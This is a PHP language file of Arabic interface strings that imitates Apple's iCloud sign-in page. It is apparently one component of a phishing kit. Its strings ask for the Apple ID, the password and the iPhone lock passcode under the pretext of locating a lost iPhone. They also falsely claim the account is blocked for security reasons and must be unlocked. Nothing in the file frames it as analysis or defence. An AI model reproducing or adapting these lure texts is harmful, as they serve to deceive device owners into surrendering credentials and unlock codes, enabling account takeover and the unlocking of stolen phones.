<?php

/* MIOS */

$lang = array();
$lang['TTILE'] = 'iCloud';
$lang['DESCRIP'] = 'سجّل الدخول إلى iCloud للوصول إلى الصور ومقاطع الفيديو والمستندات والملاحظات وجهات الاتصال والمزيد. استخدم معرف Apple الخاص بك أو أنشئ حسابًا لبدء استخدام خدمات Apple.';
$lang['DESCARGA'] = 'قم بتنزيل iCloud لـ Windows';
$lang['ACTULIZADO'] = 'حافظ على تحديث أحدث إصدار لجميع المستندات ومقاطع الفيديو والصور وغير ذلك الكثير على جهاز الكمبيوتر الخاص بك.';
$lang['DESCARGA_AHORA'] = 'التحميل الان';


//Header
$lang['CREAR_ID_APPLE'] = 'إنإنشاء معرف أبل';
$lang['ESTADO_SISTEMA'] = 'حالة النظام';
$lang['POLICY'] = 'سياسة خاصة';
$lang['TERMS'] = 'الأحكام والشروط';
$lang['COPYRIGHT'] = 'حقو1 النشر © 2021 Apple Inc. جميع الحقوق محفوظة';

$lang['COD_BLOQUEO'] = 'أدخل رمز فتح الخاص بك';
$lang['INCORRECTO'] = 'رمز القفل خاطئ.';
$lang['COMENTARIO'] = 'أدخل رمز القفل الخاص بك لمعرفة موقع iPhone المفقود.';

$lang['NO_CODIGO'] = 'لا تتذكر الرمز الخاص بك؟';
$lang['BLOQ_SEGURIDAD'] = 'تم حظر معرف Apple هذا لأسباب أمنية.';

$lang['COM_DEB_CUENTA'] = 'قبل أن تتمكن من تسجيل الدخول ، يجب عليك فتح الحساب.';

$lang['DEB_CUENTA'] = 'فتح الحساب';

$lang['VERIFI_PATRON'] = 'التحقق…';




//DATOS 

$lang['SIGN_IN_TITLE'] = 'سجّل الدخول إلى iCloud';
$lang['APPLE_ID'] = 'التفاح معرف';


$lang['PASSWORD'] = 'كلمه السر';
$lang['APPLE_INCORRECTO'] = 'كلمة المرور أو معرف Apple خاطئ.';
$lang['FORGOT_ID'] = 'هل نسيت كلمة المرور؟';
$lang['PER_CONECTADO'] = 'ابق على اتصال';
$lang['OLVIDADO'] = 'نسيت اسم المستخدم الخاص بك أبل أو كلمة المرور؟';




?>